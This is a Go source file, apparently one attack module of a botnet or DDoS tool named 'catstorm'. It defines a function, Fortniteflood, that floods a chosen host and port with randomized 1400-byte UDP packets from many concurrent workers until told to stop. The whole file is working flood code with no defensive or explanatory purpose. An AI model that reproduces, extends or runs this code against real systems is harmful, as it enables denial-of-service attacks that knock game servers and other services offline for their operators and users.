package l4

import (
	"context"
	"encoding/binary"
	"net"
	"sync"
	"catstorm/Bot/Methods"
)

func Fortniteflood(ctx context.Context, target, port string, sec int) {
	raddr, err := net.ResolveUDPAddr("udp", target+":"+port)
	if err != nil {
		return
	}

	var wg sync.WaitGroup
	workers := methods.Workers()

	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			rng := methods.NewXorShift64()
			conn, err := net.DialUDP("udp", nil, raddr)
			if err != nil {
				return
			}
			defer conn.Close()

			var bufs [16][]byte
			for i := range bufs {
				bufs[i] = make([]byte, 1400)
				binary.BigEndian.PutUint32(bufs[i][4:8], 1)
				rng.Fill(bufs[i])
			}
			idx := uint64(0)
			for {
				select {
				case <-ctx.Done():
					return
				default:
					binary.BigEndian.PutUint32(bufs[idx%16][0:4], uint32(rng.Uint64()))
					binary.BigEndian.PutUint32(bufs[idx%16][8:12], uint32(rng.Uint64()))
					binary.BigEndian.PutUint32(bufs[idx%16][12:16], uint32(rng.Uint64()))
					conn.Write(bufs[idx%16])
					idx++
				}
			}
		}()
	}
	wg.Wait()
}
